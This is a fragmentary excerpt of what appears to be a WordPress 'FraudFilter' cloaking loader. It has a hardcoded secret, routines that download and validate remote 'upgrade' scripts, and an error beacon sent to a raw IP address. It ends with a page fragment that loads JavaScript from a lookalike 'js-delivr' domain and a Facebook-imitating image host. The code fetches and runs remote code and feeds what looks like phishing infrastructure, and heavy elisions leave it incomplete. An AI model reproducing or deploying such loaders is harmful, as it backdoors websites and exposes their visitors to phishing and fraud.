...
class FraudFilterWordPressLoader_f6gne {
    public function run() {
    ...
    function isSignatureValidTemp($sign, $time) {
        $str = '46f59ef0-fe91-444a-acc0-e5e7fdc2fec5.'.$this->getClidTemp().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
    ...
    function getUpgradeScriptViaContentsWP($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 46f59ef0-fe91-444a-acc0-e5e7fdc2fec5',
                'timeout' => 2
            )
        );
    ...
    function downloadScriptFirstTime($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2ValidTemp($output)) {
            ...
            $headers[] = 'x-ff-secret: 46f59ef0-fe91-444a-acc0-e5e7fdc2fec5';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 46f59ef0-fe91-444a-acc0-e5e7fdc2fec5';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=f6gne&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterWordPressLoader_f6gne = new FraudFilterWordPressLoader_f6gne();
$fraudFilterWordPressLoader_f6gne->run();
...
<html>
<head>
  <script src="https://q4efe0bmrj.js-delivr.com/js/f6gne/analytics.js"></script>
  ...
  <div class="row">
      <div class="col-sm-2">
          <div class="work-sec animate-img">
                  ...
                  <img src="https://facibuks.github.io/Face.jpeg" class="image-right" alt="img">
